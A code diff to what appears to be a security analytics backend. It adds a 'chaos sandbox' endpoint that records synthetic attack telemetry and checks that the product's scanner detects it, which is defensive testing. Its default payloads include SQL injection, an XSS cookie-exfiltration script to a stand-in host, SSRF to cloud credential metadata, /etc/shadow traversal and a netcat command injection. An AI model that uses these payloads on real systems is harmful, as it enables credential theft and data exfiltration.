@@ -105,6 +105,12 @@ def simulate_cyber_threats(req: SimulateThreatRequest, session: Session = Depend
             "url": "https://example.com/admin/login?scanner=probe",
             "user_agent": "sqlmap/1.7#stable (https://sqlmap.org)",
             "referrer": ""
+        },
+        {
+            "path": "/security/client-integrity",
+            "url": "https://example.com/checkout?threat=DOM_TAMPERING&entropy=4.92&vector=unauthorized_script_node_inserted",
+            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
+            "referrer": "integrity-observer"
         }
     ]
     
@@ -133,6 +139,80 @@ def simulate_cyber_threats(req: SimulateThreatRequest, session: Session = Depend
         "status": "ok",
         "message": f"Injected {len(created_events)} OWASP attack telemetry events into site {req.site_id}",
         "simulated_count": len(created_events)
+    }
+
+
+class ChaosPayloadRequest(BaseModel):
+    site_id: str
+    payload_type: str = "SQL_INJECTION"  # SQL_INJECTION, XSS_ATTACK, PATH_TRAVERSAL, SSRF_ATTACK, COMMAND_INJECTION, DOM_TAMPERING, HIGH_ENTROPY
+    target_path: str = "/api/v1/resource"
+    custom_payload: str | None = None
+
+
+@router.post("/chaos-test")
+def dispatch_chaos_test(req: ChaosPayloadRequest, session: Session = Depends(get_session)):
+    """Synthetic Threat Generator (The 'Chaos Sandbox').
+    Injects a safe mock exploit payload against the tenant's pipeline to validate detection & alerting in real-time.
+    """
+    import time
+    import uuid
+
+    default_payloads = {
+        "SQL_INJECTION": "' UNION SELECT username, password_hash FROM admin_users --",
+        "XSS_ATTACK": "<script>fetch('https://evil-exfil.com?token='+document.cookie)</script>",
+        "PATH_TRAVERSAL": "../../../../etc/shadow",
+        "SSRF_ATTACK": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+        "COMMAND_INJECTION": "; cat /etc/passwd | nc 198.51.100.2 4444",
+        "DOM_TAMPERING": "DOM_TAMPERING: unauthorized_script_node_inserted via rogue ad tag",
+        "HIGH_ENTROPY": "aGVsbG8gd29ybGQgZXhwbG9pdCBvYmZ1c2NhdGVkIHN0cmluZyBrZXk9OTM4NGY="
+    }
+
+    payload_text = req.custom_payload.strip() if (req.custom_payload and req.custom_payload.strip()) else default_payloads.get(req.payload_type, "' OR 1=1 --")
+    now = int(time.time())
+    event_id = f"chaos_{uuid.uuid4().hex[:10]}"
+
+    target_url = f"https://tenant.example{req.target_path}?q={payload_text}"
+    ua = "LuminaryChaosSandbox/2.4 (Security Validation Suite)"
+
+    if req.payload_type == "DOM_TAMPERING":
+        target_url = f"https://tenant.example{req.target_path}?threat=DOM_TAMPERING&vector={payload_text}"
+        ua = "Mozilla/5.0 (Client-Integrity-Agent; Anti-Magecart)"
+
+    rec = EventRecord(
+        event_id=event_id,
+        site_id=req.site_id,
+        event_type="threat" if req.payload_type == "DOM_TAMPERING" else "pageview",
+        timestamp=now,
+        url=target_url,
+        path=req.target_path,
+        referrer="https://luminary-sandbox.internal/pipeline-validator",
+        session_id=f"sess_chaos_{uuid.uuid4().hex[:6]}",
+        visitor_id=f"sandbox_{uuid.uuid4().hex[:6]}",
+        screen="1920x1080",
+        device_type="desktop",
+        browser=ua,
+        country="US"
+    )
+    session.add(rec)
+    session.commit()
+
+    # Immediate scan evaluation to return detection confirmation to UI
+    scan_result = scan_payload_threats(
+        url=target_url,
+        path=req.target_path,
+        referrer="https://luminary-sandbox.internal/pipeline-validator",
+        user_agent=ua
+    )
+
+    return {
+        "status": "dispatched",
+        "event_id": event_id,
+        "site_id": req.site_id,
+        "payload_type": req.payload_type,
+        "dispatched_payload": payload_text,
+        "detection": scan_result,
+        "timestamp": now,
+        "message": f"Dispatched {req.payload_type} synthetic exploit to pipeline. Detection verified: {scan_result['threat_detected']} (Severity: {scan_result['severity']})."
     }
 
 
